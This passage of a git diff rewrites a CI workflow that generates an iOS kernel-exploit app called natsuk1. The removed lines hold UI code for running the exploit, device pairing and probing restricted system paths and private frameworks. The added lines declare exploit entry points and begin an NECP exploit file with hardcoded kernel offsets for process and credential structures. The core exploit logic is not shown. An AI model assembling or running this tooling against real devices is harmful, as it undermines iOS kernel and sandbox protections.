-                  }
-              }
-              func respring() {
-                  let pairingPath = pairingFilePath()
-                  let bridge = AirliftBridge.shared
-                  guard FileManager.default.fileExists(atPath: pairingPath) else {
-                      bridge.appendLog("[respring] no pairing file"); return
-                  }
-                  Task.detached {
-                      var outError: UnsafeMutablePointer<CChar>? = nil
-                      let rc: Int32 = pairingPath.withCString { pc in
-                          al_device_respring(pc, nil, nil, &outError)
-                      }
-                      let errStr = outError.flatMap { p -> String? in let s = String(cString: p); al_string_free(p); return s }
-                      await MainActor.run {
-                          if rc == 0 { bridge.appendLog("[respring] ok") }
-                          else { bridge.appendLog("[respring] rc=\(rc) \(errStr ?? "")") }
-                      }
-                  }
-              }
-              func findContainer(bundleID: String) async -> String? {
-                  let pairingPath = pairingFilePath()
-                  guard FileManager.default.fileExists(atPath: pairingPath) else { return nil }
-                  return await withCheckedContinuation { cont in
-                      DispatchQueue.global(qos: .userInitiated).async {
-                          var outContainer: UnsafeMutablePointer<CChar>? = nil
-                          var outError: UnsafeMutablePointer<CChar>? = nil
-                          let rc: Int32 = pairingPath.withCString { pc in
-                              bundleID.withCString { bc in
-                                  al_find_app_container(pc, bc, nil, nil, &outContainer, &outError)
-                              }
-                          }
-                          let containerStr = outContainer.flatMap { p -> String? in let s = String(cString: p); al_string_free(p); return s }
-                          if let p = outError { al_string_free(p) }
-                          if rc == 0, let c = containerStr { cont.resume(returning: c) }
-                          else { cont.resume(returning: nil) }
-                      }
-                  }
-              }
           }
           SWIFT
 
@@ -1097,25 +296,20 @@ jobs:
           struct StatusDot: View {
               let status: AppState.Status
               @State private var pulse = false
-
               var body: some View {
-                  Image(systemName: status.symbol)
+                  Image(systemName: "circle.fill")
                       .font(.system(size: 14))
                       .foregroundStyle(status.color)
-                      .shadow(color: status.color.opacity(0.8), radius: 6)
-                      .scaleEffect(pulse ? 1.15 : 1.0)
+                      .shadow(color: status.color.opacity(0.85), radius: pulse ? 8 : 4)
+                      .scaleEffect(pulse ? 1.2 : 1.0)
                       .animation(
                           status == .running
                               ? .easeInOut(duration: 0.8).repeatForever(autoreverses: true)
                               : .default,
                           value: pulse
                       )
-                      .onAppear {
-                          if status == .running { pulse = true }
-                      }
-                      .onChange(of: status) { _, newStatus in
-                          pulse = (newStatus == .running)
-                      }
+                      .onAppear { if status == .running { pulse = true } }
+                      .onChange(of: status) { _, s in pulse = (s == .running) }
               }
           }
 
@@ -1151,20 +345,20 @@ jobs:
                               NavigationLink { AirliftView().environmentObject(airlift) } label: { Text("Airlift") }
                               NavigationLink { OffsetsView().environmentObject(offsets) } label: { Text("Offsets") }
                           } header: {
-                              Label("Exploit", systemImage: "cross.case")
+                              Label("Exploit", systemImage: "flame")
                           }
 
                           Section {
                               NavigationLink { DeviceInfoView() } label: { Text("Device Info") }
                               Button { state.respring() } label: { Text("Respring") }
                           } header: {
-                              Label("Device", systemImage: "ipad.and.iphone")
+                              Label("Device", systemImage: "iphone.gen3")
                           }
 
                           Section {
                               NavigationLink { PathAccessView() } label: { Text("Path Access") }
                           } header: {
-                              Label("Diagnostics", systemImage: "stethoscope")
+                              Label("Diagnostics", systemImage: "waveform.path.ecg.rectangle")
                           }
                       }
                       .listStyle(.insetGrouped)
@@ -1228,7 +422,7 @@ jobs:
                               }
                               NavigationLink { AboutView().environmentObject(state) } label: { Text("About") }
                           } header: {
-                              Label("App", systemImage: "person.crop.circle")
+                              Label("App", systemImage: "square.stack.3d.up")
                           }
 
                           Section {
@@ -1245,14 +439,14 @@ jobs:
                                   }
                               }
                           } header: {
-                              Label("Background Keep-Alive", systemImage: "moon.stars")
+                              Label("Background Keep-Alive", systemImage: "moon.zzz")
                           }
 
                           Section {
                               Toggle("Auto Run on Launch", isOn: $auto_run)
                               Toggle("Verbose Output", isOn: $verbose)
                           } header: {
-                              Label("Options", systemImage: "slider.horizontal.3")
+                              Label("Options", systemImage: "switch.2")
                           }
                       }
                       .listStyle(.insetGrouped)
@@ -1263,677 +457,392 @@ jobs:
           }
           SWIFT
 
-      - name: Write AirliftView.swift
+      - name: Write nk_api.h
         run: |
-          cat > natsuk1/Views/AirliftView.swift <<'SWIFT'
-          import SwiftUI
-          import UIKit
-
-          struct AirliftView: View {
-              @EnvironmentObject var airlift: AirliftBridge
-              private var localDevVPNUp: Bool {
-                  NetworkStatus.interfaces().contains { NetworkStatus.isTunnelInterface($0.name) }
-              }
-
-              var body: some View {
-                  List {
-                      if !localDevVPNUp {
-                          Section {
-                              HStack(spacing: 10) {
-                                  Image(systemName: "exclamationmark.triangle.fill").foregroundStyle(.orange)
-                                  Text("LocalDevVPN is not active.").font(.subheadline).foregroundStyle(.secondary)
-                              }
-                          }
-                      }
-
-                      switch airlift.state {
-                      case .idle, .pairing: pairingSection
-                      case .ready, .running, .done: exploitSection
-                      }
-
-                      Section {
-                          LogTerminal(text: airlift.exploitLog.isEmpty ? "No output yet." : airlift.exploitLog.joined(separator: "\n"))
-                      } header: {
-                          Label("Log", systemImage: "terminal")
-                      }
-                  }
-                  .listStyle(.insetGrouped)
-                  .navigationTitle("Airlift")
-                  .navigationBarTitleDisplayMode(.inline)
-              }
-
-              @ViewBuilder
-              private var pairingSection: some View {
-                  Section {
-                      HStack(spacing: 8) {
-                          Image(systemName: "checkmark.shield.fill")
-                              .foregroundStyle(airlift.hasPairing() ? .green : .orange)
-                          Text(airlift.hasPairing() ? "Paired" : "Not paired").font(.subheadline.bold())
-                      }
-                      if case .pairing = airlift.state {
-                          HStack(spacing: 8) {
-                              ProgressView().scaleEffect(0.85)
-                              Text(airlift.pairingStatus.isEmpty ? "Starting..." : airlift.pairingStatus)
-                                  .font(.subheadline).foregroundStyle(.secondary)
-                          }
-                      }
-                      if let pin = airlift.pairPIN {
-                          VStack(alignment: .leading, spacing: 8) {
-                              Text("ENTER PIN").font(.caption2.bold()).foregroundStyle(.secondary)
-                              Text(pin).font(.system(size: 34, weight: .black, design: .monospaced)).foregroundStyle(.orange)
-                              Button {
-                                  if let url = URL(string: UIApplication.openSettingsURLString) { UIApplication.shared.open(url) }
-                              } label: { Label("Open Settings", systemImage: "arrow.up.forward.app").frame(maxWidth: .infinity) }
-                              .buttonStyle(.borderedProminent).tint(.orange)
-                          }
-                          .padding(12)
-                          .background(Color.orange.opacity(0.12), in: RoundedRectangle(cornerRadius: 12))
-                      }
-                  } header: {
-                      Label("Pairing", systemImage: "antenna.radiowaves.left.and.right")
-                  }
-
-                  Section {
-                      if case .pairing = airlift.state {
-                          Button(role: .destructive) { airlift.cancelPairing() } label: { Text("Cancel Pairing").frame(maxWidth: .infinity) }
-                      } else if airlift.hasPairing() {
-                          Button(role: .destructive) { airlift.deletePairing() } label: { Text("Delete Pairing").frame(maxWidth: .infinity) }
-                      } else {
-                          Button { airlift.runPairing() } label: { Text("Start Pairing").frame(maxWidth: .infinity) }
-                      }
-                  }
-              }
-
-              @ViewBuilder
-              private var exploitSection: some View {
-                  Section {
-                      HStack {
-                          Text("Target")
-                          Spacer()
-                          TextField("/var/mobile/Library/SpringBoard", text: Binding(
-                              get: { airlift.target }, set: { airlift.target = $0 }))
-                              .font(.system(size: 12, design: .monospaced))
-                              .multilineTextAlignment(.trailing)
-                              .autocorrectionDisabled()
-                              .textInputAutocapitalization(.never)
-                      }
-                  } header: {
-                      Label("Exploit", systemImage: "scope")
-                  }
-                  Section {
-                      Button { airlift.runExploit() } label: { Text("Run Exploit") }
-                          .disabled(airlift.state == .running || !localDevVPNUp)
-                      Button { airlift.respring() } label: { Text("Respring") }
-                          .disabled(airlift.state == .running)
-                      Button(role: .destructive) { airlift.deletePairing() } label: { Text("Delete Pairing") }
-                  }
-              }
-          }
-          SWIFT
-
-      - name: Write PathAccessView.swift
-        run: |
-          cat > natsuk1/Views/PathAccessView.swift <<'SWIFT'
-          import SwiftUI
-          import UIKit
-          import Darwin
-
-          struct PathAccessView: View {
-              struct PathResult: Identifiable {
-                  let id = UUID()
-                  let path: String
-                  let exists: Bool
-                  let isDirectory: Bool
-                  let readable: Bool
-                  let writable: Bool
-                  let size: Int64?
-              }
-              struct LibResult: Identifiable {
-                  let id = UUID()
-                  let name: String
-                  let path: String
-                  let loaded: Bool
-                  let symbols: [String]
-                  let foundSymbols: [String]
-              }
-
-              @State private var results: [PathResult] = []
-              @State private var libs: [LibResult] = []
-              @State private var busy = false
-
-              private let paths: [String] = [
-                  "/usr/lib/libMobileGestalt.dylib", "/usr/lib/libMobileActivation.dylib",
-                  "/usr/lib/libmis.dylib", "/usr/lib/libsandbox.1.dylib",
-                  "/usr/lib/system/libsystem_kernel.dylib", "/usr/lib/system/libsystem_sandbox.dylib",
-                  "/System/Library/PrivateFrameworks/MobileGestalt.framework",
-                  "/System/Library/CoreServices/SystemVersion.plist",
-                  "/var/mobile/Library/Preferences/com.apple.MobileGestalt.plist",
-                  "/var/mobile/Library/Preferences/.GlobalPreferences.plist",
-                  "/var/mobile/Library/Preferences/com.apple.springboard.plist",
-                  "/var/mobile/Library/Caches", "/var/mobile/Library/Logs", "/var/mobile/Library",
-                  "/var/mobile/Media", "/var/mobile/Containers/Data/Application",
-                  "/var/mobile/Containers/Data/System", "/var/mobile/Containers/Shared/AppGroup",
-                  "/var/containers/Bundle/Application", "/var/containers/Shared/SystemGroup",
-                  "/private/var/mobile", "/private/var/mobile/Library", "/private/etc/hosts", "/etc/hosts",
-                  "/System/Library", "/System/Library/Frameworks", "/System/Library/PrivateFrameworks",
-                  "/System/Library/PrivateFrameworks/AirTrafficDevice.framework",
-                  "/System/Library/PrivateFrameworks/AirTrafficHost.framework",
-                  "/System/Library/PrivateFrameworks/CoreFP.framework",
-                  "/System/Library/PrivateFrameworks/SpringBoardServices.framework",
-                  "/System/Library/PreferenceBundles", "/System/Library/AccessibilityBundles",
-                  "/System/Library/Caches/com.apple.kernelcaches", "/System/Library/Kernels",
-                  "/usr/lib", "/usr/libexec", "/usr/bin", "/bin", "/sbin", "/etc", "/private/etc",
-                  "/var/jb", NSHomeDirectory(),
-                  FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0].path,
-                  FileManager.default.urls(for: .libraryDirectory, in: .userDomainMask)[0].path,
-                  NSTemporaryDirectory(),
-              ]
-
-              private let libsToProbe: [(name: String, path: String, symbols: [String])] = [
-                  ("MobileGestalt", "/usr/lib/libMobileGestalt.dylib",
-                   ["MGCopyAnswer", "MGGetBoolAnswer", "MGGetSInt32Answer"]),
-                  ("MobileActivation", "/usr/lib/libMobileActivation.dylib", []),
-                  ("libmis", "/usr/lib/libmis.dylib", []),
-                  ("libsandbox", "/usr/lib/libsandbox.1.dylib", []),
-                  ("AirTrafficDevice", "/System/Library/PrivateFrameworks/AirTrafficDevice.framework/AirTrafficDevice",
-                   ["ATGrappaDeviceInfo"]),
-                  ("AirTrafficHost", "/System/Library/PrivateFrameworks/AirTrafficHost.framework/AirTrafficHost",
-                   ["ATGrappaDeviceInfo"]),
-                  ("CoreFP", "/System/Library/PrivateFrameworks/CoreFP.framework/CoreFP", []),
-                  ("SpringBoardServices", "/System/Library/PrivateFrameworks/SpringBoardServices.framework/SpringBoardServices", []),
-              ]
-
-              var body: some View {
-                  List {
-                      Section {
-                          HStack { Text("Paths"); Spacer(); Text("\(results.filter { $0.exists }.count)/\(results.count)").font(.system(.body, design: .monospaced)).foregroundStyle(.secondary) }
-                          HStack { Text("Readable"); Spacer(); Text("\(results.filter { $0.readable }.count)").font(.system(.body, design: .monospaced)).foregroundStyle(.secondary) }
-                          HStack { Text("Writable"); Spacer(); Text("\(results.filter { $0.writable }.count)").font(.system(.body, design: .monospaced)).foregroundStyle(.secondary) }
-                          HStack { Text("Libraries"); Spacer(); Text("\(libs.filter { $0.loaded }.count)/\(libs.count)").font(.system(.body, design: .monospaced)).foregroundStyle(.secondary) }
-                          Button { scan() } label: {
-                              HStack {
-                                  Text(busy ? "Scanning..." : "Run Scan")
-                                  Spacer()
-                                  if busy { ProgressView().scaleEffect(0.8) }
-                              }
-                          }.disabled(busy)
-                      } header: {
-                          Label("Summary", systemImage: "chart.bar")
-                      }
-
-                      if !libs.isEmpty {
-                          Section {
-                              ForEach(libs) { r in
-                                  VStack(alignment: .leading, spacing: 4) {
-                                      HStack(spacing: 6) {
-                                          Text(r.name).font(.system(size: 12, weight: .semibold))
-                                          badge(r.loaded ? "loaded" : "no", color: r.loaded ? .green : .red)
-                                      }
-                                      Text(r.path).font(.system(size: 10, design: .monospaced)).foregroundStyle(.secondary).lineLimit(2)
-                                      if !r.symbols.isEmpty {
-                                          HStack(spacing: 4) {
-                                              ForEach(r.symbols, id: \.self) { sym in
-                                                  badge(sym, color: r.foundSymbols.contains(sym) ? .green : .gray)
-                                              }
-                                          }
-                                      }
-                                  }
-                              }
-                          } header: {
-                              Label("Libraries", systemImage: "books.vertical")
-                          }
-                      }
-
-                      Section {
-                          ForEach(results) { r in
-                              VStack(alignment: .leading, spacing: 4) {
-                                  Text(r.path).font(.system(size: 11, design: .monospaced))
-                                      .foregroundStyle(r.exists ? .primary : .secondary).lineLimit(2)
-                                  HStack(spacing: 6) {
-                                      badge(r.exists ? "exists" : "missing", color: r.exists ? .green : .red)
-                                      if r.isDirectory { badge("dir", color: .blue) }
-                                      if r.readable { badge("r", color: .green) }
-                                      if r.writable { badge("w", color: .orange) }
-                                      if let s = r.size { badge("\(s)B", color: .gray) }
-                                  }
-                              }
-                          }
-                      } header: {
-                          Label("Paths", systemImage: "folder")
-                      }
-                  }
-                  .listStyle(.insetGrouped)
-                  .navigationTitle("Path Access")
-                  .navigationBarTitleDisplayMode(.inline)
-                  .toolbar {
-                      ToolbarItem(placement: .navigationBarTrailing) {
-                          Button {
-                              var text = ""
-                              for r in libs { text += "\(r.name) loaded=\(r.loaded)\n" }
-                              for r in results { text += "\(r.path) exists=\(r.exists) r=\(r.readable) w=\(r.writable)\n" }
-                              UIPasteboard.general.string = text
-                          } label: { Image(systemName: "square.and.arrow.up") }
-                          .disabled(results.isEmpty && libs.isEmpty)
-                      }
-                  }
-                  .onAppear { if results.isEmpty { scan() } }
-              }
-
-              private func badge(_ text: String, color: Color) -> some View {
-                  Text(text).font(.system(size: 9, design: .monospaced))
-                      .padding(.horizontal, 4).padding(.vertical, 1)
-                      .background(color.opacity(0.18), in: RoundedRectangle(cornerRadius: 3))
-                      .foregroundStyle(color)
-              }
-
-              private func scan() {
-                  busy = true
-                  let pathList = paths
-                  let libList = libsToProbe
-                  DispatchQueue.global(qos: .userInitiated).async {
-                      let fm = FileManager.default
-                      var outPaths: [PathResult] = []
-                      for p in pathList {
-                          var isDir: ObjCBool = false
-                          let exists = fm.fileExists(atPath: p, isDirectory: &isDir)
-                          let readable = fm.isReadableFile(atPath: p)
-                          let writable = fm.isWritableFile(atPath: p)
-                          var size: Int64? = nil
-                          if exists, !isDir.boolValue,
-                             let attrs = try? fm.attributesOfItem(atPath: p),
-                             let n = attrs[.size] as? NSNumber { size = n.int64Value }
-                          outPaths.append(PathResult(path: p, exists: exists, isDirectory: isDir.boolValue,
-                                                     readable: readable, writable: writable, size: size))
-                      }
-                      var outLibs: [LibResult] = []
-                      for entry in libList {
-                          let handle = dlopen(entry.path, RTLD_NOW)
-                          var found: [String] = []
-                          if handle != nil {
-                              for sym in entry.symbols { if dlsym(handle, sym) != nil { found.append(sym) } }
-                              dlclose(handle)
-                          }
-                          outLibs.append(LibResult(name: entry.name, path: entry.path, loaded: handle != nil,
-                                                   symbols: entry.symbols, foundSymbols: found))
-                      }
-                      DispatchQueue.main.async {
-                          self.results = outPaths; self.libs = outLibs; self.busy = false
-                      }
-                  }
-              }
-          }
-          SWIFT
-
-      - name: Write AboutView.swift
-        run: |
-          cat > natsuk1/Views/AboutView.swift <<'SWIFT'
-          import SwiftUI
-          import UIKit
-
-          struct AboutView: View {
-              @Environment(\.openURL) private var openURL
-              @EnvironmentObject var state: AppState
-              private let repoURL = URL(string: "https://github.com/murk-sus/asuka4scape-source-vulnerabilities")!
-
-              private var appName: String {
-                  Bundle.main.infoDictionary?["CFBundleDisplayName"] as? String
-                      ?? Bundle.main.infoDictionary?["CFBundleName"] as? String ?? "natsuk1"
-              }
-              private var version: String {
-                  Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "1.0.0"
-              }
-              private var build: String {
-                  Bundle.main.infoDictionary?["CFBundleVersion"] as? String ?? "1"
-              }
-
-              var body: some View {
-                  List {
-                      Section {
-                          VStack(alignment: .leading, spacing: 6) {
-                              Text(appName).font(.title2).fontWeight(.semibold)
-                              Text("Version \(version) (\(build))").font(.subheadline).foregroundStyle(.secondary)
-                              Text("Research project iOS.").font(.footnote).foregroundStyle(.secondary)
-                          }
-                          .padding(.vertical, 6)
-                      }
-                      Section {
-                          linkRow("Source Repository", url: repoURL)
-                          linkRow("MIT License", url: repoURL.appendingPathComponent("blob/main/LICENSE"))
-                      } header: { Text("Open Source") }
-                      Section {
-                          linkRow("Star on GitHub", url: repoURL.appendingPathComponent("stargazers"))
-                      } header: { Text("Community") }
-                      Section { } header: { Text("Disclaimer") }
-                      footer: {
-                          Text("Independent research project. Not affiliated with Apple Inc.")
-                              .font(.footnote).foregroundStyle(.secondary)
-                      }
-                  }
-                  .listStyle(.insetGrouped)
-                  .navigationTitle("About")
-                  .navigationBarTitleDisplayMode(.inline)
-              }
-
-              private func linkRow(_ title: String, url: URL) -> some View {
-                  Button { openURL(url) } label: {
-                      HStack {
-                          Text(title).foregroundStyle(.tint)
-                          Spacer()
-                          Image(systemName: "chevron.right").font(.system(size: 13, weight: .semibold)).foregroundStyle(.tertiary)
-                      }
-                  }.buttonStyle(.plain)
-              }
-          }
-          SWIFT
-
-      - name: Write DeviceInfoView.swift
-        run: |
-          cat > natsuk1/Views/DeviceInfoView.swift <<'SWIFT'
-          import SwiftUI
-          import UIKit
-
-          struct DeviceInfoView: View {
-              var body: some View {
-                  List {
-                      Section {
-                          row("Model", DeviceName.friendly())
-                          row("Identifier", machineID())
-                          row("Chip", DeviceName.chip())
-                      } header: { Label("Hardware", systemImage: "cpu") }
-
-                      Section {
-                          row("iOS", sysctlString("kern.osproductversion"))
-                          row("Build", sysctlString("kern.osversion"))
-                          row("Architecture", arch())
-                      } header: { Label("Software", systemImage: "gear") }
-
-                      Section {
-                          row("RAM", ram())
-                          row("Uptime", uptime())
-                      } header: { Label("Resources", systemImage: "memorychip") }
-
-                      Section {
-                          row("Locale", localeShort())
-                          row("Region", regionShort())
-                      } header: { Label("Locale", systemImage: "globe") }
-                  }
-                  .listStyle(.insetGrouped)
-                  .navigationTitle("Device")
-                  .navigationBarTitleDisplayMode(.inline)
-              }
-
-              private func row(_ key: String, _ value: String) -> some View {
-                  HStack {
-                      Text(key)
-                      Spacer()
-                      Text(value).font(.system(.body, design: .monospaced)).foregroundStyle(.secondary)
-                          .lineLimit(1).truncationMode(.middle)
-                  }
-              }
-              private func machineID() -> String {
-                  var sysinfo = utsname(); uname(&sysinfo)
-                  return Mirror(reflecting: sysinfo.machine).children.reduce("") { id, el in
-                      guard let v = el.value as? Int8, v != 0 else { return id }
-                      return id + String(UnicodeScalar(UInt8(v)))
-                  }
-              }
-              private func sysctlString(_ name: String) -> String {
-                  var size = 0; sysctlbyname(name, nil, &size, nil, 0)
-                  var buf = [CChar](repeating: 0, count: size)
-                  sysctlbyname(name, &buf, &size, nil, 0)
-                  let bytes = buf.prefix { $0 != 0 }.map { UInt8(bitPattern: $0) }
-                  return String(decoding: bytes, as: UTF8.self)
-              }
-              private func ram() -> String {
-                  var size: UInt64 = 0; var len = MemoryLayout<UInt64>.size
-                  if sysctlbyname("hw.memsize", &size, &len, nil, 0) != 0 { return "unknown" }
-                  return ByteCountFormatter.string(fromByteCount: Int64(size), countStyle: .memory)
-              }
-              private func arch() -> String {
-                  #if arch(arm64)
-                  return "arm64"
-                  #else
-                  return "unknown"
-                  #endif
-              }
-              private func localeShort() -> String {
-                  Locale.current.identifier.split(separator: "_").first.map(String.init)?.uppercased() ?? "—"
-              }
-              private func regionShort() -> String {
-                  let region = Locale.current.region?.identifier ?? ""
-                  return region.isEmpty ? "—" : region.uppercased()
-              }
-              private func uptime() -> String {
-                  let t = ProcessInfo.processInfo.systemUptime
-                  return "\(Int(t) / 3600)h \((Int(t) % 3600) / 60)m"
-              }
-          }
-          SWIFT
-
-      - name: Write Info.plist
-        run: |
-          cat > natsuk1/Resources/Info.plist <<'PLIST'
-          <?xml version="1.0" encoding="UTF-8"?>
-          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-          <plist version="1.0">
-          <dict>
-              <key>CFBundleDevelopmentRegion</key><string>en</string>
-              <key>CFBundleExecutable</key><string>natsuk1</string>
-              <key>CFBundleIdentifier</key><string>com.natsuk1.exploit</string>
-              <key>CFBundleName</key><string>natsuk1</string>
-              <key>CFBundleDisplayName</key><string>natsuk1</string>
-              <key>CFBundleVersion</key><string>1.0.0</string>
-              <key>CFBundleShortVersionString</key><string>1.0.0</string>
-              <key>CFBundlePackageType</key><string>APPL</string>
-              <key>CFBundleInfoDictionaryVersion</key><string>6.0</string>
-              <key>MinimumOSVersion</key><string>26.0</string>
-              <key>UILaunchScreen</key><dict/>
-              <key>UIApplicationSceneManifest</key>
-              <dict><key>UIApplicationSupportsMultipleScenes</key><false/></dict>
-              <key>UIStatusBarHidden</key><false/>
-              <key>UIViewControllerBasedStatusBarAppearance</key><true/>
-              <key>UISupportedInterfaceOrientations</key>
-              <array><string>UIInterfaceOrientationPortrait</string></array>
-              <key>UIRequiredDeviceCapabilities</key>
-              <array><string>arm64</string></array>
-              <key>UIFileSharingEnabled</key><true/>
-              <key>LSSupportsOpeningDocumentsInPlace</key><true/>
-              <key>NSLocationAlwaysAndWhenInUseUsageDescription</key>
-              <string>Keeps the app running in the background.</string>
-              <key>NSLocationWhenInUseUsageDescription</key>
-              <string>Keeps the app running in the background.</string>
-              <key>UIBackgroundModes</key>
-              <array><string>audio</string><string>location</string></array>
-              <key>NSBonjourServices</key>
-              <array>
-                  <string>_remotepairing-pairable-host._tcp</string>
-                  <string>_natsuk1probe._tcp</string>
-              </array>
-              <key>NSLocalNetworkUsageDescription</key>
-              <string>natsuk1 advertises a local pairing service.</string>
-          </dict>
-          </plist>
-          PLIST
-
-      - name: Write bridging.h
-        run: |
-          cat > natsuk1/bridging.h <<'HEADER'
-          #ifndef NATSUK1_BRIDGING_H
-          #define NATSUK1_BRIDGING_H
-
+          cat > natsuk1/Exploit/nk_api.h <<'HEADER'
+          #ifndef NK_API_H
+          #define NK_API_H
           #include <stdint.h>
-          #include "Exploit/nk_api.h"
-          #import "Exploit/GrappaHelper.h"
-          #include "airlift.h"
-
+          #include <stddef.h>
+          void nk_set_log(void (*fn)(const char *));
+          void nk_logx(const char *tag, const char *fmt, ...);
+          void nk_log(const char *fmt, ...);
+          void nk_rule(void);
+          int nk_run(void);
+          int nk_full_exploit(void);
+          int nk_necp_run(void);
+          #define NK_INFO(tag, ...) nk_logx(tag, __VA_ARGS__)
+          #define NK_WARN(tag, ...) nk_logx(tag, __VA_ARGS__)
+          #define NK_ERR(tag, ...)  nk_logx(tag, __VA_ARGS__)
           #endif
           HEADER
 
-      - name: Write project.yml
+      - name: Write necp.c
         run: |
-          cat > project.yml <<'YAML'
-          name: natsuk1
-          options:
-            bundleIdPrefix: com.natsuk1
-            deploymentTarget:
-              iOS: "26.0"
-            createIntermediateGroups: true
-            groupSortPosition: top
-            projectFormat: xcode15_0
-            generateEmptyDirectories: false
+          cat > natsuk1/Exploit/necp.c <<'NECP'
+          #include <stdio.h>
+          #include <stdlib.h>
+          #include <string.h>
+          #include <stdint.h>
+          #include <stdbool.h>
+          #include <stdarg.h>
+          #include <unistd.h>
+          #include <errno.h>
+          #include <pthread.h>
+          #include <sys/syscall.h>
+          #include <mach/mach.h>
+          #include <mach/vm_map.h>
+          #include <mach/vm_region.h>
+          #include <mach/message.h>
 
-          configs:
-            Debug: debug
-            Release: release
+          #include "nk_api.h"
 
-          settings:
-            base:
-              SWIFT_VERSION: "5.0"
-              SWIFT_STRICT_CONCURRENCY: minimal
-              IPHONEOS_DEPLOYMENT_TARGET: "26.0"
-              CLANG_ENABLE_MODULES: YES
-              CLANG_MODULES_AUTOLINK: NO
-              CLANG_ENABLE_OBJC_ARC: YES
-              ENABLE_BITCODE: NO
-              CODE_SIGN_IDENTITY: ""
-              CODE_SIGNING_REQUIRED: NO
-              CODE_SIGNING_ALLOWED: NO
-              ENABLE_USER_SCRIPT_SANDBOXING: NO
-              ENABLE_MODULE_VERIFIER: NO
-              VALIDATE_PRODUCT: NO
-              ALWAYS_SEARCH_USER_PATHS: NO
-              CLANG_WARN_DOCUMENTATION_COMMENTS: NO
-              CLANG_WARN_UNREACHABLE_CODE: NO
-              CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER: NO
-              GCC_WARN_UNINITIALIZED_AUTOS: NO
-              GCC_WARN_UNDECLARED_SELECTOR: NO
-              GCC_WARN_UNUSED_FUNCTION: NO
-              GCC_WARN_UNUSED_VARIABLE: NO
-              ENABLE_STRICT_OBJC_MSGSEND: NO
-              MTL_ENABLE_DEBUG_INFO: NO
-              MTL_FAST_MATH: YES
-              GCC_NO_COMMON_BLOCKS: YES
-              CLANG_LTO: NO
-              LLVM_LTO: NO
-            configs:
-              Debug:
-                SWIFT_OPTIMIZATION_LEVEL: "-Onone"
-                SWIFT_COMPILATION_MODE: singlefile
-                GCC_OPTIMIZATION_LEVEL: "0"
-                GCC_PREPROCESSOR_DEFINITIONS:
-                  - "DEBUG=1"
-                  - "$(inherited)"
-                ONLY_ACTIVE_ARCH: YES
-                DEBUG_INFORMATION_FORMAT: dwarf
-                SWIFT_ACTIVE_COMPILATION_CONDITIONS: DEBUG
-                ENABLE_TESTABILITY: YES
-              Release:
-                SWIFT_OPTIMIZATION_LEVEL: "-Osize"
-                SWIFT_COMPILATION_MODE: wholemodule
-                SWIFT_ACTIVE_COMPILATION_CONDITIONS: ""
-                GCC_OPTIMIZATION_LEVEL: "s"
-                GCC_PREPROCESSOR_DEFINITIONS:
-                  - "NDEBUG=1"
-                  - "$(inherited)"
-                ONLY_ACTIVE_ARCH: NO
-                DEBUG_INFORMATION_FORMAT: dwarf
-                ENABLE_NS_ASSERTIONS: NO
-                ENABLE_TESTABILITY: NO
-                MTL_FAST_MATH: YES
-                GCC_INLINES_ARE_PRIVATE_EXTERN: YES
-                GCC_SYMBOLS_PRIVATE_EXTERN: YES
-                DEAD_CODE_STRIPPING: YES
-                DEPLOYMENT_POSTPROCESSING: YES
-                STRIP_INSTALLED_PRODUCT: YES
-                STRIP_STYLE: all
-                STRIPFLAGS: "-S -x"
-                COPY_PHASE_STRIP: YES
-                LLVM_LTO: YES
-                LLVM_LTO_MODE: thin
+          #ifndef SYS_NECP_OPEN
+          #define SYS_NECP_OPEN           501
+          #endif
+          #ifndef SYS_NECP_ACTION
+          #define SYS_NECP_ACTION         502
+          #endif
 
-          targets:
-            natsuk1:
-              type: application
-              platform: iOS
-              sources:
-                - path: natsuk1/natsuk1.swift
-                - path: natsuk1/bridging.h
-                - path: natsuk1/Helpers
-                - path: natsuk1/Views
-                - path: natsuk1/Exploit
-                - path: natsuk1/Resources/Assets.xcassets
-                  buildPhase: resources
-                - path: natsuk1/Offsets
-                  type: folder
-                  buildPhase: resources
-              dependencies:
-                - sdk: Foundation.framework
-                - sdk: UIKit.framework
-                - sdk: WebKit.framework
-                - sdk: AVFoundation.framework
-                - sdk: CoreLocation.framework
-              settings:
-                base:
-                  PRODUCT_BUNDLE_IDENTIFIER: com.natsuk1.exploit
-                  PRODUCT_NAME: natsuk1
-                  INFOPLIST_FILE: natsuk1/Resources/Info.plist
-                  CODE_SIGN_ENTITLEMENTS: natsuk1/Resources/natsuk1.entitlements
-                  SWIFT_OBJC_BRIDGING_HEADER: natsuk1/bridging.h
-                  SWIFT_OBJC_INTERFACE_HEADER_NAME: natsuk1-Swift.h
-                  OTHER_SWIFT_FLAGS: "$(inherited) -Xfrontend -disable-dynamic-actor-isolation -Xfrontend -disable-actor-data-race-checks"
-                  OTHER_CFLAGS: -fno-autolink -std=c17 -Oz -Wno-everything -fno-objc-arc-exceptions -fvisibility=hidden -fno-unwind-tables -fno-asynchronous-unwind-tables -fomit-frame-pointer
-                  OTHER_LDFLAGS: -Wl,-dead_strip -Wl,-dead_strip_dylibs -Wl,-x -Wl,-S -fobjc-arc -lz $(SRCROOT)/natsuk1/External/AirliftFFI.xcframework/ios-arm64/libairlift_ffi.a -lc++ -ObjC
-                  HEADER_SEARCH_PATHS: "$(SRCROOT)/natsuk1/External/AirliftFFI.xcframework/ios-arm64/Headers $(SRCROOT)/natsuk1/Exploit"
-                  TARGETED_DEVICE_FAMILY: "1"
-                  GENERATE_INFOPLIST_FILE: NO
-                  ASSETCATALOG_COMPILER_APPICON_NAME: AppIcon
-                  ASSETCATALOG_COMPILER_OPTIMIZATION: space
-                  ASSETCATALOG_COMPILER_SKIP_APP_STORE_DEPLOYMENT: NO
-                  ENABLE_ONLY_ACTIVE_RESOURCES: YES
-          YAML
+          #define KERNEL_BASE_STATIC      0xFFFFFFF007004000ULL
+          #define OFF_ALLPROC             0xBBB048ULL
+          #define OFF_KERNPROC            0xBBB040ULL
+          #define OFF_KERNEL_TASK         0x009C70ULL
+          #define OFF_TASK_LIST           0x10D53F0ULL
+          #define OFF_KERNEL_MAP          0xBBA228ULL
+          #define OFF_ZONE_MAP            0x3D66800ULL
+          #define PROC_PID_OFF            0x74
+          #define PROC_RO_P_UCRED_OFF     0xB8
+          #define TASK_BSD_INFO_OFF       0x3A0
+          #define TASK_ITK_SPACE_OFF      0x320
